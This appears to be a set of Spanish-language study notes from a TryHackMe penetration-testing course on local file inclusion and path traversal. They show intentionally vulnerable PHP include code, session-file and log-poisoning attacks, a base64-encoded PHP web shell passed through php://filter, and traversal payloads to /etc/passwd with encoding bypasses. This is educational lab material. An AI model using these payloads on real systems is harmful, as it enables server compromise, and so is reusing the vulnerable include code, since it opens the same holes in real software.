[
  {
    "title": "5. LFI2RCE - Session Files",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/5-lfi2rce-session-files/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/5. LFI2RCE - Session Files.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Archivos de Sesión PHP</h2>\nLos archivos de sesión PH también pueden ser usados en un ataque LFI, llevando a RCE, particularmente si un atacante puede manipular la información de sesión. En una aplicación web típica, la información de sesión se guarda en archivos en el servidor. Si un atacante puede inyectar código malicioso en estos archivos de sesión y si la aplicación incluye estos archivos mediante una vulnerabilidad LFI, esto puede llevar a RCE.\n\nPor ejemplo, la aplicación vulnerable hosteada en `http://IP/sessions.php` contiene el siguiente código:\n\n```php\nif(isset($_GET['page'])){\n    $_SESSION['page'] = $_GET['page'];\n    echo \"You're currently in\" . $_GET[\"page\"];\n    include($_GET['page']);\n}\n```\n\nUn atacante podría explotar esta vulnerabilidad inyectando código PHP en su variable de sesión usando `<? echo phpinfo(); ?>` en el parámetro de la página.\n\n![[Pasted image 20260126130003.png]]\n\nEl código es guardado en el archivo de sesión del servidor. Por ello, el atacante puede usar la vulnerabilidad LFI para incluir este archivo de sesión. Como los IDs de sesión son hasheados, el ID puede ser encontrado en las cookies del navegador.\n\n![[Pasted image 20260126130114.png]]\n\nAcceder a la URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` ejecutará el código PHP inyectado en el archivo de sesión.\n\n![[Pasted image 20260126130501.png]]",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "6. LFI2RCE - Log Poisoning",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/6-lfi2rce-log-poisoning/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/6. LFI2RCE - Log Poisoning.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "El log poisoning es una técnica donde el atacante inyecta código ejecutable en el archivo de registro de un servidor web y usa una vulnerabilidad LFI para incluir y ejecutar este archivo de registro. Este mñetodo es particularmente sigiloso porque los archivos de registro se comparten y son aparentemente inofensivos. En un ataque de log poisoning, el atacante debe inyectar código PHP malicioso en un archivo log. Una vez inyectado, puede usar una LFI para incluir el archivo como uno estándar. Esto causa que el servidor ejecute el código malicioso contenido en el archivo de registro, llevando a RCE.\n\nPor ejemplo, si un atacante manda una petición Netcat a una máquina vulnerable que contiene código PHP:\n\n```bash\n$ nc MACHINE_IP 80\n```\n```php      \n<?php echo phpinfo(); ?>\n```\n```http\nHTTP/1.1 400 Bad Request\nDate: Thu, 23 Nov 2023 05:39:55 GMT\nServer: Apache/2.4.41 (Ubuntu)\nContent-Length: 335\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n```\n```html\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n<hr>\n<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>\n</body></html>\n```\n\nEl código será registrado en el log de acceso del servidor.\n\n![[Pasted image 20260126131211.png]]\n\nEl atacante entonces usa LFI para incluir el archivo de registro de acceso: `?page=/var/log/apache2/access.log`.\n\n![[Pasted image 20260126131245.png]]\n\nPara replicar la demo de arriba puedes ir a `http://IP/playground.php`.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "7. LFI2RCE - Wrappers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/7-lfi2rce-wrappers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/7. LFI2RCE - Wrappers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "Los wrappers PHP también pueden ser usados no sólo para leer archivos sino para ejecutar código. La clave aquí es el wrapper `php://filter` el cual habilita las transformaciónes de archivos al vuelo. Toma el filtro de PHP base64, por ejemplo. Este método permite a los atacantes ejecutar código arbitrario en el servidor usando un payload base64-encodeado.\n\nPor ejemplo, ve a `http://IP/playground.php`.\n\nUsaremos el código PHP `<? system($_GET['cmd']); echo 'Shell done!'; ?>` como nuestro payload. El valor del payload, cuando se base64-encodea es `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`.\n\n| **Position** | **Field**        | **Value**                                                            |\n| ------------ | ---------------- | -------------------------------------------------------------------- |\n| 1            | Protocol Wrapper | php://filter                                                         |\n| 2            | Filter           | convert.base64-decode                                                |\n| 3            | Resource Type    | resource=                                                            |\n| 4            | Data Type        | data://plain/text,                                                   |\n| 5            | Encoded Payload  | PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ |\n\nEn la tabla de arriba, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` es la versión base64-encodeada del código PHP. Cuando el servidor procesa esta petición, primero decodifica la string en base64 y luego ejecuta el código PHP, permitiendo a un atacante ejecutar comandos en el servidor vía el parámetro GET \"cmd\".\n\n![[Pasted image 20260126131850.png]]\n\n>[!IMPORTANT] Es importante no incluir **&cmd=whoami** en el campo de input ya que será encodeado cuando se suba el formulario. Una vez encodeado, el backend tratará como parte de código base64, dándote un error de secuencia inválida.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "4. Base Directory Breakouts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/4-base-directory-breakouts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/4. Base Directory Breakouts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Salida del Directorio Base</h2>\nEn las aplicaciones web, los sistemas de seguridad se ponen para evitar ataques de path traversal. Sin embargo estas defensas no siempre son a prueba de todo. Debajo está el código de una aplicación que insiste en que el nombre de archivo dado por el usuario debe comenzar con un directorio base predeterminado y también dividirá las strings de traversal para proteger la aplicación de ataques de file traversal:\n\n```php\nfunction containsStr($str, $subStr){\n    return strpos($str, $subStr) !== false;\n}\n\nif(isset($_GET['page'])){\n    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){\n        include $_GET['page'];\n    }else{ \n        echo 'You are not allowed to go outside /var/www/html/ directory!';\n    }\n}\n```\n\nEs posible cumplir con estos requerimientos y navegar a otros directorios. Esto puede ser conseguido añadiendo las secuencias de directory traversal después del archivo base.\n\nPor ejemplo, ve a `http://IP/lfi.php` y usa el payload `/var/www/html/..//..//..//etc/passwd`.\n\nLa función PHP `constrainsStr` comprueba si unasubstring existe en una string. La condición if comprueba dos cosas. Primero, si `$_GET['page']` no contiene la substring `../..`, y si `$_GET['page']` contiene la substring `/var/www/html`. Sin embargo, `..//..//` bypassea este filtro porque navega dos directorios hacia arriba, como `../../`. No coincide, sin embargo, exactamente con el patrón bloqueado `../..` debido a las `/` extra.\n\n![[Pasted image 20260126123725.png]]\n\n-------------------------------------\n<h2>Ofuscación</h2>\nLas técnicas de ofuscación son normalmente usadas para bypassear filtros de seguridad básicos que puedan tener las aplicaciones. Estos filtros suelen buscar secuencias obvias de directory traversal como `../`. Sin embargo, los atcantes pueden evadir la detección de estas srtings ofuscándolas.\n\nEl encodeo transforma caracteres a un formato diferente. En LFI, los atacantes suelen usar URL encoding, donde los caracteres se representan usando símbolos de porcentaje seguidos de valores hexadecimales. Por ejemplo, `../` puede encodearse de varias maneras:\n\n- **Encoding URL Estándar:** `../` se convierte en `%2e%2e%2f`.\n- **Doble Encoding:** Útil si la aplicación decodifica el input 2 veces. `../` se convierte en `%252e%252e%252f`.\n- **Ofuscación:** Los atacantes pueden usar payloads como `....//`, lo que puede ayudar a evitar la detección mediante coincidencia de string o mecanismos de filtrado. Esta técnica de ofuscación pretende ocultar los intentos de directory traversal, haciéndolos menos obvios para filtros básicos.\n\nPor ejemplo, imagina una aplicación que mitiga LFI filtrando `../`:\n\n```php\n$file = $_GET['file'];\n$file = str_replace('../', '', $file);\n\ninclude('files/' . $file);\n```\n\nUn atacante puede potencialmente sobrepasar este filtro usando los siguientes métodos.\n\n1. **URL Encoded Bypass:** El atacante usa la versión URL-encodeada del payload como `?file=%2e%2e%2fconfig.php`. El servidor decodea este input a `../config.php`.\n2. **Double Encoded Bypass:** El atacante puede usar doble encoding si la aplicación decodea el input dos veces. El payload sería `?file=%252e%252e%252fconfig.php`, donde hay un punto es `%252e` y donde hay una barra es `%252f`.\n3. **Obfuscation:** Un atacante podría usar el payload `....//config.php` lo que después de aplicar los filtros de la aplicación se convierte en `../config.php`.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "0. File Inclusion and Path Traversal",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/0-file-inclusion-and-path-traversal/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/0. File Inclusion and Path Traversal.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "[[1. Web Application Architecture]]\n[[2. File Inclusion Types]]\n[[3. PHP Wrappers]]\n[[4. Base Directory Breakouts]]\n[[5. LFI2RCE - Session Files]]\n[[6. LFI2RCE - Log Poisoning]]\n[[7. LFI2RCE - Wrappers]]",
    "modified": "2026-01-27T00:59:05"
  }
]